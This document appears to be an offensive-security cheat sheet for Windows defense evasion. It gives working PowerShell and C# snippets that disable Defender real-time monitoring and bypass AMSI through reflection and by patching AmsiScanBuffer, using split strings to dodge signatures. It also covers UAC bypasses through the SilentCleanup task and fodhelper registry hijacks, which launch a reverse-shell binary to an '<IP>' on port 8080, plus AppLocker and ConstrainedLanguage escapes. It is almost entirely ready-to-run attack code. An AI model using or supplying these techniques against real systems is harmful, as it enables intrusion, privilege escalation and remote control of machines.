# Defender Module for PowerShell

[Documentation](https://learn.microsoft.com/en-us/powershell/module/defender/)

```powershell
Get-MpComputerStatus
Get-MpThreat [-ThreatID XXXX]
Get-MpThreatDetection [-ThreatID XXXX]
Set-MpPreference -DisableRealTimeMonitoring $true
```

# ThreatCheck

[GitHub Repository](https://github.com/rasta-mouse/ThreatCheck)

```
ThreatCheck.exe -f .\YourFile.exe
```

# Bypassing AMSI

## 1: Setting amsiInitFailed

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```

## 2: Patching amsiScanBuffer

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;
$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
$hModule = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
```

## 3: Forcing an Error

```powershell
$utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context','NonPublic,Static');
$session = $utils.GetField('amsi'+'Session','NonPublic,Static');

$marshal = [System.Runtime.InteropServices.Marshal];
$newContext = $marshal::AllocHGlobal(4);

$context.SetValue($null,[IntPtr]$newContext);
$session.SetValue($null,$null);
```

# Bypassing UAC

## 1: DiskCleanup Scheduled Task Hijack

```powershell
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8080 & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"

Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```

## 2: FodHelper Execution Hijack

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Tasks\RShell <IP> 8080" -Force
C:\Windows\System32\fodhelper.exe

Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

# AppLocker

## Enumerating AppLocker

```powershell
Get-AppLockerPolicy -Effective -Xml
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\SysinternalsSuite\procexp.exe -User max
```

## Bypassing AppLocker

#### InstallUtil

```csharp
using System;
using System.Configuration.Install;

public class NotMalware_IU
{
    public static void Main(string[] args)
    {
    }
}

[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // CODE EXECUTION
    }
}
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U YourFile.exe
```

#### RunDll32

```csharp
namespace RShell_D
{
    internal class Program
    {
        [DllExport("DllMain")]
        public static void DllMain()
        {
            // CODE EXECUTION
        }
    }
}
```

```powershell
C:\Windows\System32\RunDll32.exe YourFile.dll,DllMain
```

## Bypassing ConstrainedLanguage Mode

```csharp
Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = runspace;
ps.AddScript(String.Join(" ", args));
Collection<PSObject> results = ps.Invoke();
foreach (PSObject obj in results)
{
    Console.WriteLine(obj.ToString());
}

runspace.Close();
```